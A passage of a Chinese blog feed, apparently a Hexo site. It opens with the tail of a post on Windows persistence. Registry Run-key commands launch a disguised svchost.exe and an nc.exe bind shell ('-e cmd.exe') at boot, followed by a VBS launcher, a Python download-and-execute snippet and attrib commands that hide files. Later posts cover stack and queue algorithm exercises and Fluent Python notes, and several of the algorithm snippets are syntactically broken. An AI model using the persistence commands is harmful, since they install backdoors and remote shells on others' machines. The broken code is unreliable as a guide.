HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v AUTORUN /t</code><br><code>REG_SZ /d &#39;C:\svchost.exe /f</code></p><ul><li>下载nc.exe到目录\system32\nc.exe</li><li><p><code>reg add &quot;HKLM\software\microsoft\windows\currentversion\run&quot; /f /v &quot;system&quot; /t REG_SZ</code><br><code>/d &quot;C:\windows\system32\nc.exe -Ldp 1234 -e cmd.exe&quot;</code></p></li><li><p>接受反弹的shell</p></li></ul><p>​        <code>nc -nv 目标机器端口</code></p><h4 id="2-vbs脚本"><a href="#2-vbs脚本" class="headerlink" title="2.vbs脚本"></a>2.vbs脚本</h4><figure class="highlight vbs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Dim</span> objShell</span><br><span class="line"><span class="keyword">Set</span> objShell = WScript.<span class="built_in">CreateObject</span>(<span class="string">"WScript.shell"</span>)</span><br><span class="line">objShell.run <span class="string">"C:\windows\system32\nc.exe -Ldp 1234 -e cmd.exe"</span></span><br><span class="line"><span class="keyword">Set</span> objShell = <span class="literal">Nothing</span></span><br><span class="line">vbs</span><br></pre></td></tr></table></figure><h4 id="3-python"><a href="#3-python" class="headerlink" title="3.python"></a>3.python</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">exe = <span class="string">'http://dwiadwaad/svchost.exe'</span></span><br><span class="line">r = requests.get(exe)</span><br><span class="line"><span class="keyword">if</span> os.path.exists(os.path.abspath(os.curdir)+<span class="string">r"\svchost.tmp.exe"</span>): <span class="comment"># if_muma.exe_exists</span></span><br><span class="line">os.popen(os.path.abspath(os.curdir)+<span class="string">r"\svchost.tmp.exe"</span>) <span class="comment">#exec_muma.exe</span></span><br></pre></td></tr></table></figure><p><code>attrib +a +b +r +h</code> 隐藏文件的操作</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>栈和队列算法题</title>
      <link href="/2019/07/15/zhan-he-dui-lie-suan-fa-ti/"/>
      <url>/2019/07/15/zhan-he-dui-lie-suan-fa-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="栈和队列的算法"><a href="#栈和队列的算法" class="headerlink" title="栈和队列的算法"></a>栈和队列的算法</h1><hr><h2 id="1-设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作"><a href="#1-设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作" class="headerlink" title="1.设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作"></a>1.设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">设计一个栈，在实现栈的基本功能的基础上，再实现返回栈中的最小元素的操作</span></span><br><span class="line"><span class="string">1. 要求pop、push、getMin操作的时间复杂度都是O(1)</span></span><br><span class="line"><span class="string">2. 设计的栈类型可以使用现成的栈结构</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">getMinStack</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">self.mydeque=deque()</span><br><span class="line">self.mixdeque=deque()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">push</span><span class="params">(self,element)</span>:</span></span><br><span class="line"><span class="keyword">if</span>(len(self.mydeque)==<span class="number">0</span>):</span><br><span class="line">self.mydeque.append(element)</span><br><span class="line">self.mixdeque.append(element)</span><br><span class="line"><span class="keyword">elif</span> <span class="keyword">not</span> element&gt;mixdeque[<span class="number">-1</span>]:</span><br><span class="line">self.mixdeque.append(element)</span><br><span class="line">self.mydeque.append(element)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></span><br><span class="line">element=self.mydeque.pop()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> element&gt;self.mixdeque[<span class="number">-1</span>]:</span><br><span class="line">self.mixdeque.pop()</span><br><span class="line"><span class="keyword">return</span> element</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMix</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">return</span> self.mixdeque[<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __main__==<span class="string">"__name__"</span>:</span><br><span class="line">test=getMinStack()</span><br><span class="line">a=range(<span class="number">1</span>,<span class="number">100</span>,<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> random.sample(a, <span class="number">9</span>):</span><br><span class="line">test.push(i)</span><br></pre></td></tr></table></figure><h2 id="2-用两个栈组成队列"><a href="#2-用两个栈组成队列" class="headerlink" title="2.用两个栈组成队列"></a>2.用两个栈组成队列</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TwoStackQueue</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    初始化两个空栈</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.stackPush=deque()</span><br><span class="line">        self.stackPop=deque()</span><br><span class="line">    </span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    向栈中添加元素,直接将元素加到push栈里面</span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self,number)</span>:</span></span><br><span class="line">         self.stackPush.append(number)</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    pop需要先将push的一次倒出装到pop里面，然后从pop栈里面pop出一个元素</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pop</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(self.stackPop)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> self.stackPop.pop()</span><br><span class="line">        <span class="keyword">elif</span> len(self.stackPush)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> len(self.stackPush)&gt;<span class="number">0</span>:</span><br><span class="line">                self.stackPush.add(self.stackPush.pop())</span><br><span class="line">            <span class="keyword">return</span> self.stackPop.pop()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"empty queue"</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">peak</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> len(self.stackPop)==<span class="number">0</span>&amp;&amp;len(self.stackPush)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">raise</span> Exception(<span class="string">"empty queue"</span>)</span><br><span class="line">        <span class="keyword">elif</span> len(self.stackPush)==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">while</span> len(self.stackPush)==<span class="number">0</span>:</span><br><span class="line">                self.stackPush.append(self.stackPush.pop())</span><br><span class="line">        <span class="keyword">return</span> self.stackPop[<span class="number">-1</span>]</span><br></pre></td></tr></table></figure><h2 id="3-使用仅用递归函数和栈逆序一个栈"><a href="#3-使用仅用递归函数和栈逆序一个栈" class="headerlink" title="3.使用仅用递归函数和栈逆序一个栈"></a>3.使用仅用递归函数和栈逆序一个栈</h2><p>递归的基本思想，是把规模较大的一个问题，分解成规模较小的多个子问题去解决，而每一个子问题又可以继续拆分成多个更小的子问题。或者说，必须先解决子问题，再基于子问题来解决当前问题。既然我们要逆序一个栈，就要将栈的最底部拿出来，先这样考虑，极限的情况下，栈只有一个元素，那么直接就弹出这个元素，不需要逆序，如果是两个的元素，先取出一个如果栈不是空的，就继续取，将最低的元素取出返回，再压栈。那么第一个函数 是:</p><p><img src="/.com//1563348840255.png" alt="1563348840255"></p><p>这个时候的函数为:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getAndRemoveLast</span><span class="params">(mylist)</span>:</span></span><br><span class="line">    result=mylist.pop()</span><br><span class="line">    <span class="keyword">if</span> len(mylist)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        last=getAndRemoveLast(mylist)</span><br><span class="line">        mylist.push(result)</span><br><span class="line">        <span class="keyword">return</span> last</span><br></pre></td></tr></table></figure><p><img src="/.com//1563349656167.png" alt="1563349656167"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">revers</span><span class="params">(mylist)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(mylist)==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    temp=getAndRemoveLast(mylist)</span><br><span class="line">    revers(mylist)</span><br><span class="line">    mylist.push(temp)</span><br></pre></td></tr></table></figure><h2 id="4-用一个栈实现另一个栈的排序"><a href="#4-用一个栈实现另一个栈的排序" class="headerlink" title="4.用一个栈实现另一个栈的排序"></a>4.用一个栈实现另一个栈的排序</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> deque</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sortBystack</span><span class="params">(mylist)</span>:</span></span><br><span class="line">    helpstack=deque()</span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    只要栈不为空，就取出当前栈的最顶点的，然后和辅助栈的最上面进行比较，如果辅助栈比较大，就弹出来装到当前栈，这样的话，就会将辅助栈所有比当前栈顶大的全部放到当前栈</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">while</span> len(mylist)&gt;<span class="number">0</span>:</span><br><span class="line">        temp=mylist.pop()</span><br><span class="line">        <span class="keyword">while</span> len(helpstack)&gt;<span class="number">0</span>&amp;&amp;(helpstack[<span class="number">-1</span>]&gt;temp):</span><br><span class="line">            mylist.append(helpstack.pop())</span><br><span class="line">        helpstack.append(temp)</span><br><span class="line">    <span class="keyword">while</span> len(helpstack)&gt;<span class="number">0</span>:</span><br><span class="line">        mylist.append(helpstack.pop())</span><br></pre></td></tr></table></figure><h2 id="5-正常的汉贝塔问题"><a href="#5-正常的汉贝塔问题" class="headerlink" title="5.正常的汉贝塔问题"></a>5.正常的汉贝塔问题</h2><p>A，B，C三个圆柱，分别为初始位，过渡位，目标位，设A柱为初始位，C位为最终目标位。</p><p>（1）将最上面的n-1个圆盘从初始位移动到过渡位</p><p>（2）将初始位的最底下的一个圆盘移动到目标位</p><p>（3）将过渡位的n-1个圆盘移动到目标位</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanbei</span><span class="params">(n,a,b,c)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n==<span class="number">1</span>:</span><br><span class="line">        print(<span class="string">'&#123;0&#125;--&gt;&#123;1&#125;'</span>.format(a,c))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        hanbei(n<span class="number">-1</span>,a,c,b)</span><br><span class="line">        print(<span class="string">'&#123;0&#125;--&gt;&#123;1&#125;'</span>.format(a,c))</span><br><span class="line">        hanbei(n<span class="number">-1</span>,b,a,c)</span><br><span class="line"></span><br><span class="line">hanbei(<span class="number">3</span>,<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>)</span><br></pre></td></tr></table></figure><h2 id="6-用栈来求解有限制的汉贝塔问题"><a href="#6-用栈来求解有限制的汉贝塔问题" class="headerlink" title="6.用栈来求解有限制的汉贝塔问题"></a>6.用栈来求解有限制的汉贝塔问题</h2><p>不能从最右边的塔直接移动道最左侧，也不能从最左侧搬到最右侧，必须经过中间。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hanbita</span><span class="params">(num,left,mid,right)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> num&lt;<span class="number">1</span>:</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        如果没用元素，直接就返回0</span></span><br><span class="line"><span class="string">        </span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        否则就返回一个递归函数</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">    <span class="keyword">return</span> process(num,left,mid,right,left,right)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(num,left,mid,right,origh,to)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> num==<span class="number">1</span>:</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        如果数字只有一个，且出发点或者到达点是中间的那根柱子，那么直接移动过去，且移动了一次</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        <span class="keyword">if</span> origh==<span class="string">'mid'</span> <span class="keyword">or</span> to==<span class="string">'mid'</span>:</span><br><span class="line">            print(<span class="string">"move 1 from %s  to %s"</span>.format(origh,to))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        否则，那么就是从左到右，或者从右到左，那么必须经过中间那根柱子的移动，移动需要两次</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"move 1 from %s  to mid"</span>.format(origh))</span><br><span class="line">            print(<span class="string">"move 1 from %s  to %s"</span>.format(mid,to))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">from</span>==<span class="string">"mid"</span> <span class="keyword">or</span> origh==<span class="string">"mid"</span>:</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        如果是很多，不止一个，且是从中间搬到两边，或者两边搬到中间就先将上面的n-1先从左边搬到右边，采用递归的方式，</span></span><br><span class="line"><span class="string">        然后将最底下的搬到中间，最后再将n-1个搬到中间</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        another=(origh=="left")||(to=="left")?right:left</span><br><span class="line">        part1=process(num<span class="number">-1</span>,left,mid,right,origh,another)</span><br><span class="line">        part2=<span class="number">1</span></span><br><span class="line">        print(<span class="string">"move %s from %s to %s"</span>.format(num,origh,another))</span><br><span class="line">        part3=process(num<span class="number">-1</span>,left,mid,right,another,to)</span><br><span class="line">        <span class="keyword">return</span> part1+part2+part3</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="string">'''</span></span><br><span class="line"><span class="string">        从左边移动到右边，或者从右边移动到左边</span></span><br><span class="line"><span class="string">        '''</span></span><br><span class="line">        part1=process(num<span class="number">-1</span>,left,mid,right,origh,to)</span><br><span class="line">        part2=<span class="number">1</span></span><br><span class="line">        print(<span class="string">"move %s from %s to %s"</span>.format(num,origh,to))</span><br><span class="line">        part3=process(num<span class="number">-1</span>,left,mid,right,to,origh)</span><br><span class="line">        part4=<span class="number">1</span></span><br><span class="line">        print(<span class="string">"move %s from %s to %s"</span>.format(num,mid,to))</span><br><span class="line">        part5=process(num<span class="number">-1</span>,left,mid,right,origh,to)</span><br><span class="line">        <span class="keyword">return</span> part1+part2+part3+part4+part5</span><br></pre></td></tr></table></figure><h2 id="7-滑动窗口"><a href="#7-滑动窗口" class="headerlink" title="7.滑动窗口"></a>7.滑动窗口</h2><p>有一个整数数组arr和一个大小为w的窗口从数组的最左边滑到最右边，窗口每次都向右边滑一个位置，输入:整形数组arr，窗口大小为w</p><p>输出：一个长度为n-w+1的数组res,res[i]表示每一种窗口状态下的最大值</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">slide_windows</span><span class="params">(arr,w_size)</span>:</span></span><br><span class="line">    max_arr=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(arr)-w_size+<span class="number">1</span>):</span><br><span class="line">        new_arr=arr[i:i+w_size]</span><br><span class="line">        max_arr.append(max(new_arr))</span><br><span class="line">    <span class="keyword">return</span> max_arr</span><br><span class="line">max_arr=slide_windows([<span class="number">4</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">6</span>,<span class="number">7</span>],<span class="number">3</span>)</span><br><span class="line">print(max_arr)</span><br></pre></td></tr></table></figure><h2 id="8-求最大子矩阵的大小"><a href="#8-求最大子矩阵的大小" class="headerlink" title="8.求最大子矩阵的大小"></a>8.求最大子矩阵的大小</h2><p>题目描述：给定一个整形的矩阵map，其中给的值只有0和1两种，求其中全是1的所有矩阵区域中，最大的矩形区域为1的数量。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">maxRecSize</span><span class="params">(map)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxRecFromBottom</span><span class="params">(height)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> height == <span class="literal">None</span> <span class="keyword">or</span> len(height) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        stack = []</span><br><span class="line">        maxArea = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(len(height)):</span><br><span class="line">            <span class="keyword">while</span> stack <span class="keyword">and</span> height[stack[<span class="number">-1</span>]] &gt;= height[i]:</span><br><span class="line">                j = stack.pop()</span><br><span class="line">                k = stack[<span class="number">-1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">                maxArea = max(maxArea, (i-k<span class="number">-1</span>) * height[j])</span><br><span class="line">            stack.append(i)</span><br><span class="line">        <span class="keyword">while</span> stack:</span><br><span class="line">            j = stack.pop()</span><br><span class="line">            k = stack[<span class="number">-1</span>] <span class="keyword">if</span> stack <span class="keyword">else</span> <span class="number">-1</span></span><br><span class="line">            maxArea = max(maxArea, (len(height)-k<span class="number">-1</span>) * height[j])</span><br><span class="line">        <span class="keyword">return</span> maxArea</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> map == <span class="literal">None</span> <span class="keyword">or</span> len(map) == <span class="number">0</span> <span class="keyword">or</span> len(map[<span class="number">0</span>]) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    height = [<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(len(map[<span class="number">0</span>]))]</span><br><span class="line">    maxArea = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(map)):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(map[<span class="number">0</span>])):</span><br><span class="line">            height[j] = <span class="number">0</span> <span class="keyword">if</span> map[i][j] == <span class="number">0</span> <span class="keyword">else</span> height[j] + <span class="number">1</span></span><br><span class="line">        maxArea = max(maxArea, maxRecFromBottom(height))</span><br><span class="line">    <span class="keyword">return</span> maxArea</span><br></pre></td></tr></table></figure><h2 id="9-两数相加"><a href="#9-两数相加" class="headerlink" title="9.两数相加"></a>9.两数相加</h2><p>给出两个 <strong>非空</strong> 的链表用来表示两个非负的整数。其中，它们各自的位数是按照 <strong>逆序</strong> 的方式存储的，并且它们的每个节点只能存储 <strong>一位</strong> 数字。</p><p>如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。</p><p>您可以假设除了数字 0 之外，这两个数都不会以 0 开头。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span><span class="params">(object)</span>:</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">addTwoNumbers</span><span class="params">(self, l1, l2)</span>:</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        :type l1: ListNode</span></span><br><span class="line"><span class="string">        :type l2: ListNode</span></span><br><span class="line"><span class="string">        :rtype: ListNode</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        <span class="keyword">if</span> l1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> l2</span><br><span class="line">        <span class="keyword">if</span> l2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">return</span> l1</span><br><span class="line">        tmp = ListNode(<span class="number">0</span>)</span><br><span class="line">        res = tmp</span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> l1 <span class="keyword">or</span> l2:</span><br><span class="line">            tmpsum = <span class="number">0</span></span><br><span class="line">            <span class="keyword">if</span> l1:</span><br><span class="line">                tmpsum = l1.val</span><br><span class="line">                l1 = l1.next</span><br><span class="line">            <span class="keyword">if</span> l2:</span><br><span class="line">                tmpsum += l2.val</span><br><span class="line">                l2 = l2.next</span><br><span class="line">            tmpres = ((tmpsum + flag) % <span class="number">10</span>)</span><br><span class="line">            flag = ((tmpsum + flag) // <span class="number">10</span>)</span><br><span class="line">            res.next = ListNode(tmpres)</span><br><span class="line">            res = res.next</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            res.next = ListNode(<span class="number">1</span>)</span><br><span class="line">        res = tmp.next</span><br><span class="line">        <span class="keyword">del</span> tmp</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><h2 id="10-爬楼梯问题"><a href="#10-爬楼梯问题" class="headerlink" title="10.爬楼梯问题"></a>10.爬楼梯问题</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">def fun(n):</span><br><span class="line">    if n==0:</span><br><span class="line">        return ‘error’</span><br><span class="line">    elif n==1:</span><br><span class="line">        return 1</span><br><span class="line">    elif n==2:</span><br><span class="line">        return 2</span><br><span class="line">    else:</span><br><span class="line">        return fun(n-2)+fun(n-1)</span><br><span class="line">print(fun(3))</span><br><span class="line"></span><br><span class="line"># 一次1和2和3个台阶</span><br><span class="line">#到n层有三种情况，n-3，n-2，n-1</span><br><span class="line">#分别的情况种类为fun1(n-3)，fun1(n-2)，fun1(n-1)</span><br><span class="line">def fun1(n):</span><br><span class="line">    if n==0:</span><br><span class="line">        return &apos;error&apos;</span><br><span class="line">    elif n == 1:</span><br><span class="line">        return 1</span><br><span class="line">    elif n==2:</span><br><span class="line">        return 2</span><br><span class="line">    elif n==3:</span><br><span class="line">        return 4</span><br><span class="line">    else:</span><br><span class="line">        return fun1(n-3)+fun1(n-2)+fun1(n-1)</span><br><span class="line">print(fun1(3))</span><br></pre></td></tr></table></figure><h2 id="11-求众数"><a href="#11-求众数" class="headerlink" title="11.求众数"></a>11.求众数</h2><p>给定一个大小为 <em>n</em> 的数组，找到其中的众数。众数是指在数组中出现次数<strong>大于</strong> <code>⌊ n/2 ⌋</code> 的元素。 </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>流畅的Python学习笔记</title>
      <link href="/2019/07/15/liu-chang-de-python-xue-xi-bi-ji/"/>
      <url>/2019/07/15/liu-chang-de-python-xue-xi-bi-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="流畅的python学习笔记"><a href="#流畅的python学习笔记" class="headerlink" title="流畅的python学习笔记"></a>流畅的python学习笔记</h1><hr><h1 id="第一章节-python特殊方法"><a href="#第一章节-python特殊方法" class="headerlink" title="第一章节 python特殊方法"></a>第一章节 python特殊方法</h1><ol><li><p>python里面的特殊方法(魔术方法)  <code>__getitem__</code>,<code>len（）</code></p></li><li><p>collections.namedtuple构建一个简单的类，这个类只有少量的属性没有方法</p><p><code>def namedtuple(typename, field_names, verbose=False, rename=False)</code></p><p><strong>typename:</strong>类名称</p><p><strong>field_names：</strong>字段名称，保证元素间顺序不变的可遍历对象或者是逗号链接起来的字符串</p><p><strong>verbose</strong>：设置为true的话会打印出类的定义代码</p></li><li><p>for i in x: 实际上调用的是iter(x)，<code>x.__iter__()</code>方法</p></li><li><p><code>__repr_</code>将对象用字符串的形式表达出来，交互式控制台和调试程序用repr函数来获取字符串表示</p></li><li><p><code>__repr__</code>和<code>__str__</code>的区别:str函数或者print打印一个对象的时候调用，如果没用实现str函数，python会使用repr调用，repr式用来记录日志，后者式用来给终端用户看的</p></li><li><p>if (一个对象)或者while(一个对象)会调用这个对象的bool魔术方法，如果这个魔术方法没用定义它会len方法，返回0就是false,否则就会返回true</p></li><li><p>len的方法在内置类中调用特别块，因为它使用了cpython直接从C结构体中读取对象的长度，完全不会调用任何方法，</p></li></ol><h1 id="第二章节-序列"><a href="#第二章节-序列" class="headerlink" title="第二章节  序列"></a>第二章节  序列</h1><h1 id="2-1-列表的分类"><a href="#2-1-列表的分类" class="headerlink" title="2.1 列表的分类"></a>2.1 列表的分类</h1><p>序列分为两种：</p><p>容器序列：list、tuple、collections.deque可以存放不同类型的数据，存放的是对象的引用</p><p>扁平序列:</p><p>str、bytes、bytearray、memoryview和array.array都只能容纳一种类型，存放的不是引用，是值。</p><p>可变的序列: list、bytearray、array.array、collections.deque和memoryview</p><p>不可变的：tuple、str和bytes。</p><h2 id="2-2-列表的推导和可读性（生成列表）"><a href="#2-2-列表的推导和可读性（生成列表）" class="headerlink" title="2.2 列表的推导和可读性（生成列表）"></a>2.2 列表的推导和可读性（生成列表）</h2><h2 id="2-3-生成器表达式"><a href="#2-3-生成器表达式" class="headerlink" title="2.3 生成器表达式"></a>2.3 生成器表达式</h2><p>生成器表达式可以逐个的产出元素，而不是建立一个完整的列表，方括号换成圆括号。</p><h2 id="2-4-元组"><a href="#2-4-元组" class="headerlink" title="2.4 元组"></a>2.4 元组</h2><p>不可变的列表+<strong>记录</strong></p><p>b,a=a,b交换变量</p><p>divmod（20，8）=（2，4）</p><p>元组的拆包</p><p>具名元组：collections.namedtuple的使用</p><h2 id="2-5-切片"><a href="#2-5-切片" class="headerlink" title="2.5 切片"></a>2.5 切片</h2><h3 id="2-5-1-为什么切片最后一个值不取？"><a href="#2-5-1-为什么切片最后一个值不取？" class="headerlink" title="2.5.1 为什么切片最后一个值不取？"></a>2.5.1 为什么切片最后一个值不取？</h3><p>元组列表和字符串都支持切片操作。python的切片和区间操作不包含区间范围的最后一个元素是python的风格，</p><p>切片忽略最后一个元素的好处：</p><ul><li>当只有末尾的数字的index的时候可以快速看出切片和区间里含有几个元素</li><li>当起止位置信息都可见的时候，可以快速计算出切片和区间的长度，</li><li>快速将序列分割成不重叠的两部分，my_list[:x]和my_list[x:]可以</li></ul><h3 id="2-5-2-切片的间隔取值"><a href="#2-5-2-切片的间隔取值" class="headerlink" title="2.5.2 切片的间隔取值"></a>2.5.2 切片的间隔取值</h3><p>s[a,b,c]<code>其中c为负值就是反向取值</code>seq.<strong>getitem</strong>(slice(start,stop,step))`</p><p>slice对象</p><h3 id="2-5-3-多维切片和省略"><a href="#2-5-3-多维切片和省略" class="headerlink" title="2.5.3 多维切片和省略"></a>2.5.3 多维切片和省略</h3><h3 id="2-5-4-序列使用-和"><a href="#2-5-4-序列使用-和" class="headerlink" title="2.5.4 序列使用+和*"></a>2.5.4 序列使用+和*</h3><p>不会修改原来的操作对象，构建一个全新的序列。</p><h3 id="2-5-5-序列的增量赋值"><a href="#2-5-5-序列的增量赋值" class="headerlink" title="2.5.5 序列的增量赋值"></a>2.5.5 序列的增量赋值</h3><p>+=<code>使用的特殊方法是&#39;__iadd__</code>，如果没实现就会调用<code>__add__</code></p><p>不可变使用就会重新创建。可变数组会改变数组的值</p><p><strong>These Python Tutor</strong> ，很好可视化代码的工具</p><p>dis.dis查看字节码，可以看到代码背后的运行机制。</p><h3 id="2-5-6-list-sort和sorted的区别"><a href="#2-5-6-list-sort和sorted的区别" class="headerlink" title="2.5.6 list.sort和sorted的区别"></a>2.5.6 list.sort和sorted的区别</h3><p>sort不会返回值，它直接会就地进行一个排序，函数存在两个参数 key和reverse</p><h3 id="2-5-7-bisect和insort进行已排序的序列的管理"><a href="#2-5-7-bisect和insort进行已排序的序列的管理" class="headerlink" title="2.5.7  bisect和insort进行已排序的序列的管理"></a>2.5.7  bisect和insort进行已排序的序列的管理</h3><h3 id="2-5-9-deque"><a href="#2-5-9-deque" class="headerlink" title="2.5.9 deque"></a>2.5.9 deque</h3><h1 id="第三章-字典和集合"><a href="#第三章-字典和集合" class="headerlink" title="第三章 字典和集合"></a>第三章 字典和集合</h1><p>isinstance(my_dict,abc.Mapping),可散列需要有两个方法:<code>__hash_`</code>和<strong>qe</strong>`,</p><p>字典推导</p><h2 id="1-常见的映射方法"><a href="#1-常见的映射方法" class="headerlink" title="1.常见的映射方法"></a>1.常见的映射方法</h2><p>dict、collections.defaultdict、defaultdict.orderedDict</p><h2 id="2-使用setdefault处理找不到的键"><a href="#2-使用setdefault处理找不到的键" class="headerlink" title="2.使用setdefault处理找不到的键"></a>2.使用setdefault处理找不到的键</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dict.setdefault(key, default=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>setdefault 同时也会改变 dict 的值</p><h2 id="3-映射的弹性键查询"><a 